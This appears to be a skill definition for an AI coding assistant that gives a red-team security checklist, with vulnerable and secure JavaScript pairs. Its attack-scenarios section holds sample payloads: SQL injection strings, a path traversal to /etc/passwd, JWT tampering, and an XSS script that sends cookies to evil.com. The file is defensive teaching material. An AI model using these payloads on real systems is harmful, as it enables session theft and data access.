---
name: b0ase-security-check
description: Red-team security analysis and penetration testing. Use before commits, deployments, or when implementing sensitive features. Triggers on "security check", "pen test", "red team review", "check for vulnerabilities", or "run security audit". Acts as adversarial security researcher to find exploits.
license: MIT
metadata:
  author: b0ase.com
  version: "1.0.0"
---

# b0ase Security Check

Red-team penetration testing and security analysis. Acts as an adversarial security researcher to uncover vulnerabilities, permission gaps, and attack vectors before they reach production.

## When to Use

**ALWAYS run before:**
- Committing sensitive code (auth, payments, data handling)
- Deploying to production
- Merging security-related PRs
- Releasing new features

**Use when:**
- Implementing authentication/authorization
- Handling user input or file uploads
- Processing payments or sensitive data
- Building APIs or webhooks
- Adding third-party integrations
- Modifying access controls

## How It Works

This skill performs adversarial security testing across multiple vectors:

1. **OWASP Top 10 Analysis** - Check for common web vulnerabilities
2. **Authentication/Authorization** - Test auth bypass, privilege escalation
3. **Input Validation** - Injection attacks (SQL, XSS, command)
4. **Data Exposure** - Sensitive data leakage, improper access controls
5. **Configuration** - Secrets, CORS, headers, dependencies
6. **Business Logic** - Race conditions, workflow bypasses
7. **API Security** - Rate limiting, mass assignment, IDOR

## Security Checklist

### 1. Authentication & Authorization

**Check for:**
- [ ] Password requirements (min length, complexity)
- [ ] Password hashing (bcrypt, argon2, NOT md5/sha1)
- [ ] Session management (secure cookies, timeout)
- [ ] Token security (JWT validation, expiry, rotation)
- [ ] Multi-factor authentication available
- [ ] Account lockout after failed attempts
- [ ] Password reset flow secure (no token reuse, expiry)
- [ ] OAuth/SSO properly implemented

**Attack Vectors:**
```javascript
// ✗ VULNERABLE: Weak password hashing
const hash = crypto.createHash('md5').update(password).digest('hex')

// ✓ SECURE: Strong hashing with salt
import bcrypt from 'bcrypt'
const hash = await bcrypt.hash(password, 12)
```

**Privilege Escalation:**
```javascript
// ✗ VULNERABLE: Client-side role check only
if (user.role === 'admin') {
  showAdminPanel()
}

// ✓ SECURE: Server-side enforcement
// API checks user.role from database, not from request
```

**Session Hijacking:**
```javascript
// ✗ VULNERABLE: Session token in URL or localStorage
const token = localStorage.getItem('session')

// ✓ SECURE: HttpOnly secure cookie
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',
  maxAge: 3600000
})
```

### 2. Input Validation & Injection

**Check for:**
- [ ] All user input validated and sanitized
- [ ] SQL queries use parameterized statements
- [ ] No eval() or exec() on user input
- [ ] File uploads restricted by type and size
- [ ] XSS protection (CSP headers, output encoding)
- [ ] Command injection prevention
- [ ] Path traversal protection
- [ ] NoSQL injection prevention

**SQL Injection:**
```javascript
// ✗ VULNERABLE: String concatenation
const query = `SELECT * FROM users WHERE email = '${email}'`

// ✓ SECURE: Parameterized query
const query = 'SELECT * FROM users WHERE email = $1'
const result = await db.query(query, [email])
```

**XSS (Cross-Site Scripting):**
```javascript
// ✗ VULNERABLE: Unsanitized HTML
dangerouslySetInnerHTML={{ __html: userComment }}

// ✓ SECURE: Sanitized or escaped
import DOMPurify from 'isomorphic-dompurify'
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(userComment) }}
```

**Command Injection:**
```javascript
// ✗ VULNERABLE: User input in shell command
exec(`convert ${userFile} output.png`)

// ✓ SECURE: Use library APIs, validate input
import sharp from 'sharp'
await sharp(validatedFile).toFile('output.png')
```

**Path Traversal:**
```javascript
// ✗ VULNERABLE: User-controlled file path
const file = fs.readFileSync(`./uploads/${req.query.file}`)
// Attack: ?file=../../etc/passwd

// ✓ SECURE: Validate and restrict to safe directory
import path from 'path'
const safeFile = path.basename(req.query.file)
const filePath = path.join('./uploads', safeFile)
if (!filePath.startsWith('./uploads/')) throw new Error('Invalid path')
```

### 3. Data Exposure

**Check for:**
- [ ] No secrets in code or git history
- [ ] API responses don't leak sensitive data
- [ ] Error messages don't reveal system info
- [ ] Logs don't contain passwords/tokens
- [ ] Database queries use SELECT specific columns (not *)
- [ ] PII is encrypted at rest
- [ ] HTTPS enforced everywhere
- [ ] No sensitive data in URLs

**Information Leakage:**
```javascript
// ✗ VULNERABLE: Error reveals DB structure
catch (error) {
  res.json({ error: error.message })
  // "column 'ssn' does not exist in table 'users'"
}

// ✓ SECURE: Generic error message
catch (error) {
  console.error(error) // Log server-side only
  res.json({ error: 'An error occurred' })
}
```

**Mass Assignment:**
```javascript
// ✗ VULNERABLE: User can set any field
await User.create(req.body)
// Attack: { email: "x", isAdmin: true }

// ✓ SECURE: Explicitly whitelist fields
const { email, name } = req.body
await User.create({ email, name })
```

**IDOR (Insecure Direct Object Reference):**
```javascript
// ✗ VULNERABLE: No ownership check
const doc = await Document.findById(req.params.id)
return doc

// ✓ SECURE: Verify user owns resource
const doc = await Document.findOne({
  _id: req.params.id,
  userId: req.user.id
})
if (!doc) throw new Error('Not found')
```

### 4. API Security

**Check for:**
- [ ] Rate limiting on all endpoints
- [ ] API keys rotated and scoped
- [ ] Authentication required on sensitive endpoints
- [ ] CORS properly configured
- [ ] GraphQL query depth/complexity limits
- [ ] Pagination on list endpoints
- [ ] Request size limits
- [ ] Webhook signature verification

**Rate Limiting:**
```javascript
// ✗ VULNERABLE: No rate limiting
app.post('/api/login', loginHandler)

// ✓ SECURE: Rate limiting
import rateLimit from 'express-rate-limit'
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: 'Too many attempts'
})
app.post('/api/login', limiter, loginHandler)
```

**CORS Misconfiguration:**
```javascript
// ✗ VULNERABLE: Allow all origins
app.use(cors({ origin: '*' }))

// ✓ SECURE: Whitelist specific origins
app.use(cors({
  origin: ['https://app.example.com'],
  credentials: true
}))
```

### 5. Business Logic Flaws

**Check for:**
- [ ] Race conditions in critical operations
- [ ] Price/quantity manipulation in e-commerce
- [ ] Workflow step bypassing
- [ ] Negative quantity/amount handling
- [ ] Double-spend prevention
- [ ] Replay attack protection
- [ ] Time-of-check-time-of-use (TOCTOU) gaps

**Race Condition:**
```javascript
// ✗ VULNERABLE: Check-then-act race condition
if (user.balance >= amount) {
  await processPayment(amount)
  await updateBalance(user.id, user.balance - amount)
}
// Two simultaneous requests can both pass the check

// ✓ SECURE: Atomic database operation
await db.query(`
  UPDATE users
  SET balance = balance - $1
  WHERE id = $2 AND balance >= $1
`, [amount, userId])
```

**Price Manipulation:**
```javascript
// ✗ VULNERABLE: Trust client-side price
const order = {
  productId: req.body.productId,
  price: req.body.price // Client sends price!
}

// ✓ SECURE: Fetch price from database
const product = await Product.findById(req.body.productId)
const order = {
  productId: product.id,
  price: product.price // Server-side price
}
```

### 6. Configuration & Dependencies

**Check for:**
- [ ] No debug mode in production
- [ ] Security headers set (CSP, HSTS, X-Frame-Options)
- [ ] Dependencies regularly updated (pnpm audit)
- [ ] No vulnerable packages (critical/high CVEs)
- [ ] Environment variables for all secrets
- [ ] Least-privilege database permissions
- [ ] Disabled unnecessary services/ports

**Security Headers:**
```javascript
// ✓ SECURE: Comprehensive security headers
import helmet from 'helmet'
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
    }
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}))
```

### 7. File Upload Security

**Check for:**
- [ ] File type validation (magic bytes, not just extension)
- [ ] File size limits enforced
- [ ] Uploads stored outside webroot
- [ ] Virus scanning on uploads
- [ ] Filename sanitization
- [ ] Image processing to strip EXIF/metadata
- [ ] No execution permissions on upload directory

**Secure Upload:**
```javascript
import multer from 'multer'
import path from 'path'
import crypto from 'crypto'

const storage = multer.diskStorage({
  destination: './uploads', // Outside public directory
  filename: (req, file, cb) => {
    // Random filename, ignore user input
    const id = crypto.randomBytes(16).toString('hex')
    cb(null, id + path.extname(file.originalname))
  }
})

const upload = multer({
  storage,
  limits: { fileSize: 5 * 1024 * 1024 }, // 5MB max
  fileFilter: (req, file, cb) => {
    const allowed = ['.jpg', '.png', '.pdf']
    const ext = path.extname(file.originalname).toLowerCase()
    if (allowed.includes(ext)) {
      cb(null, true)
    } else {
      cb(new Error('Invalid file type'))
    }
  }
})
```

## Pre-Commit Security Checklist

Before every commit involving:

### Authentication/Authorization Code
- [ ] Password hashing using bcrypt/argon2 (NOT md5/sha1)
- [ ] Session tokens in HttpOnly secure cookies
- [ ] All auth checks on server-side
- [ ] Role/permission checks before data access
- [ ] Account lockout after failed attempts

### User Input Handling
- [ ] All inputs validated with schema (zod, joi, yup)
- [ ] SQL queries use parameterized statements
- [ ] No eval(), exec(), or dynamic code execution
- [ ] XSS protection via sanitization or CSP
- [ ] File uploads restricted and validated

### API Endpoints
- [ ] Rate limiting on all endpoints
- [ ] Authentication required on sensitive routes
- [ ] CORS whitelist (NOT wildcard)
- [ ] Input validation on all parameters
- [ ] Error messages don't leak internal info

### Data Access
- [ ] Ownership checks before returning data
- [ ] SELECT specific columns (not *)
- [ ] Sensitive fields excluded from responses
- [ ] PII encrypted at rest
- [ ] Audit logging for sensitive operations

### Configuration
- [ ] No secrets in code or git history
- [ ] All secrets in environment variables
- [ ] Security headers configured (helmet)
- [ ] HTTPS enforced
- [ ] Debug mode disabled in production

## Automated Security Scan

Run the automated security scanner:

```bash
bash /mnt/skills/user/security-check/scripts/scan.sh [project-path]
```

This checks for:
- Hardcoded secrets (API keys, passwords)
- Vulnerable dependencies (npm audit / pnpm audit)
- Missing security headers
- Insecure configurations
- Common vulnerability patterns

## Red Team Testing Prompts

When doing manual red-team analysis, ask:

1. **Authentication**: "How can I bypass the login?"
2. **Authorization**: "Can I access other users' data?"
3. **Input**: "What happens if I send malicious input?"
4. **Logic**: "Can I manipulate prices/quantities/workflows?"
5. **Rate Limiting**: "Can I make unlimited requests?"
6. **Sessions**: "Can I hijack or fixate sessions?"
7. **APIs**: "What if I send unexpected JSON fields?"
8. **Files**: "Can I upload executable files?"
9. **Errors**: "Do error messages reveal sensitive info?"
10. **Race Conditions**: "What if two requests happen simultaneously?"

## Common Attack Scenarios

### Scenario 1: E-commerce Price Manipulation
**Attack**: Change product price in POST request
**Test**:
```bash
# Normal request
curl -X POST /api/checkout -d '{"productId": 123, "price": 99.99}'

# Attack attempt
curl -X POST /api/checkout -d '{"productId": 123, "price": 0.01}'
```
**Defense**: Server must fetch price from database, never trust client

### Scenario 2: Authentication Bypass
**Attack**: Modify JWT token payload
**Test**:
```javascript
// Decode JWT, change role to 'admin', re-encode
// If server doesn't verify signature, auth bypassed
```
**Defense**: Always verify JWT signature server-side

### Scenario 3: SQL Injection via Search
**Attack**: Inject SQL in search parameter
**Test**:
```bash
curl '/api/search?q=test%27%20OR%201=1--'
# Translates to: SELECT * FROM posts WHERE title = 'test' OR 1=1--'
```
**Defense**: Use parameterized queries

### Scenario 4: IDOR (Access Other User Data)
**Attack**: Change user ID in API request
**Test**:
```bash
# My profile
curl /api/users/123

# Someone else's profile
curl /api/users/124
```
**Defense**: Check req.user.id === req.params.id server-side

### Scenario 5: XSS via Comment
**Attack**: Submit comment with JavaScript
**Test**:
```html
<script>fetch('https://evil.com?cookie='+document.cookie)</script>
```
**Defense**: Sanitize HTML or use textContent (not innerHTML)

## Severity Ratings

When vulnerabilities are found, rate by severity:

**CRITICAL** - Immediate exploitation risk
- SQL injection allowing data exfiltration
- Authentication bypass
- Remote code execution
- Hardcoded production secrets in code

**HIGH** - Significant security impact
- XSS allowing cookie theft
- IDOR exposing sensitive user data
- CSRF on state-changing operations
- Weak password hashing (md5, sha1)

**MEDIUM** - Moderate security concern
- Missing rate limiting
- Information disclosure in errors
- Insecure session configuration
- Missing security headers

**LOW** - Minor security improvement
- Verbose error messages
- Missing CSRF token on low-impact forms
- Outdated dependencies (no known exploits)

## Present Results to User

After security check, present findings:

```
========================================
SECURITY CHECK RESULTS
========================================

CRITICAL ISSUES: 0
HIGH ISSUES: 2
MEDIUM ISSUES: 3
LOW ISSUES: 1

=== HIGH SEVERITY ===

1. SQL Injection in Search [HIGH]
   File: app/api/search/route.ts:23
   Issue: Direct string concatenation in SQL query
   Attack: /api/search?q=' OR 1=1--
   Fix: Use parameterized query with $1 placeholder

2. IDOR in User Profile [HIGH]
   File: app/api/users/[id]/route.ts:15
   Issue: No ownership check before returning data
   Attack: Change user ID to access other profiles
   Fix: Add WHERE userId = $currentUserId

=== MEDIUM SEVERITY ===

3. Missing Rate Limiting [MEDIUM]
   File: app/api/login/route.ts
   Issue: No rate limit on login attempts
   Attack: Brute force password guessing
   Fix: Add express-rate-limit middleware

... (continue for all findings)

RECOMMENDATIONS:
1. Fix CRITICAL and HIGH issues before deployment
2. Run pnpm audit to check dependencies
3. Add helmet for security headers
4. Enable CSP (Content Security Policy)
5. Review error handling to prevent info leakage

NEXT STEPS:
1. Fix issues in priority order
2. Re-run security check
3. Add tests for security controls
4. Document security assumptions
```

## Integration with Git Hooks

Add to `.git/hooks/pre-commit`:

```bash
#!/bin/bash
echo "Running security check..."
bash ~/.claude/skills/security-check/scripts/scan.sh .

if [ $? -ne 0 ]; then
    echo "❌ Security issues found. Fix before committing."
    exit 1
fi
```

## Resources

- OWASP Top 10: https://owasp.org/www-project-top-ten/
- OWASP Cheat Sheets: https://cheatsheetseries.owasp.org/
- CWE Top 25: https://cwe.mitre.org/top25/
- NIST Secure Coding: https://www.nist.gov/itl/ssd/software-quality-group/secure-coding

## Disclaimer

This skill provides security guidance but is not a replacement for:
- Professional penetration testing
- Security audits by certified professionals
- Comprehensive threat modeling
- Regular security training

Use as a first line of defense, not the only line.
